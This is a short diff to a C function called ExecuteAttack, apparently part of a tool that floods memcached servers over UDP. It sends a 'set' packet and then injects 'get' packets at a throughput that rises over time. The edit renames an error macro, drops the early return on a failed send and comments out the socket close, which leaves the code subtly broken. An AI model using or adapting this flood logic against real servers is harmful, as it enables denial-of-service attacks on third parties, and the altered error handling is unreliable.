@@ -4,22 +4,23 @@
 #include "common/injector.h"
 
 
-#define FAIL -1
+#define ERROR_MEMCACHED -1
 #define STRIKE 0
 
 int ExecuteAttack( AttackPlan * atkData )
 {
-  int sock = CreateSocket( UDP, false );
+  int sock = CreateSocket( UDP, BLOCK );
 
-  if( SendPacket(sock, atkData->setPacket) < 0 ){
+  if( SendPacket(sock, atkData->setPacket) < 0 )
+  {
     CloseSocket(sock);
-    return FAIL;
+    ELOG(ERROR_MEMCACHED, "error memcached\n");
   }
    
-  atkData->injectorId = CreateInjection( atkData->getPacket, atkData->initialThroughput, atkData->timer, atkData->incFrequency, atkData->incThroughput );
+  atkData->injectorId = CreateInjection( *atkData->getPacket, atkData->initialThroughput, atkData->timer, atkData->incFrequency, atkData->incThroughput );
   InjectionResume( atkData->injectorId );  
   
-  CloseSocket(sock);
+  //CloseSocket(sock);
   return STRIKE;
 }
 
